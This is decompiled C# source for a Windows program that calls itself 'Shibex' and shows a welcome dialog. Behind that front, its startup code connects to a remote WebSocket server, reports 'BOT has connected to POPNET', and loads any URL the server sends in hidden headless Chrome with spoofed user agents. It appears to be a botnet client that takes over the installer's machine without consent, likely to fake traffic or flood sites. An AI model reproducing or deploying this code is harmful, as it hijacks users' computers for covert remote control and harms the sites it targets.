using System;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Extensions.Logging;
using PuppeteerSharp;
using WebSocketSharp;

namespace WindowsFormsApp1;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		MessageBox.Show("Welcome to Shibex!", "Shibex", MessageBoxButtons.OK);
		WebSocket webSocket = new WebSocket("wss://insanepog.littsedth.repl.co/");
		webSocket.Connect();
		webSocket.Send("BOT has connected to POPNET.");
		webSocket.OnMessage += OnMessage;
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(defaultValue: false);
		Application.Run(new Shibex());
	}

	private static void OnMessage(object sender, MessageEventArgs e)
	{
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		string[] array = new string[7] { "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edg/103.0.1264.37", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 12.4; rv:101.0) Gecko/20100101 Firefox/101.0" };
		try
		{
			LaunchOptions val = new LaunchOptions();
			val.set_Headless(true);
			val.set_IgnoreHTTPSErrors(true);
			val.set_ExecutablePath("c:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
			Browser result = Puppeteer.LaunchAsync(val, (ILoggerFactory)null).Result;
			int height = 0;
			int width = 0;
			Page val2 = null;
			Page[] result2 = result.PagesAsync().Result;
			val2 = ((result2.Count() <= 0) ? result.NewPageAsync().Result : result2[0]);
			ViewPortOptions val3 = new ViewPortOptions();
			val3.set_Height(height);
			val3.set_Width(width);
			ViewPortOptions viewportAsync = val3;
			Random random = new Random();
			int num = random.Next(array.Length);
			val2.SetUserAgentAsync(array[num]);
			val2.SetViewportAsync(viewportAsync).Wait();
			NavigationOptions val4 = new NavigationOptions();
			val4.set_Timeout((int?)120000);
			NavigationOptions val5 = val4;
			val2.set_DefaultNavigationTimeout(120000);
			val2.GoToAsync(e.Data, (int?)null, (WaitUntilNavigation[])null);
			Thread.Sleep(32000);
			val2.CloseAsync((PageCloseOptions)null);
		}
		catch (Exception)
		{
		}
	}
}
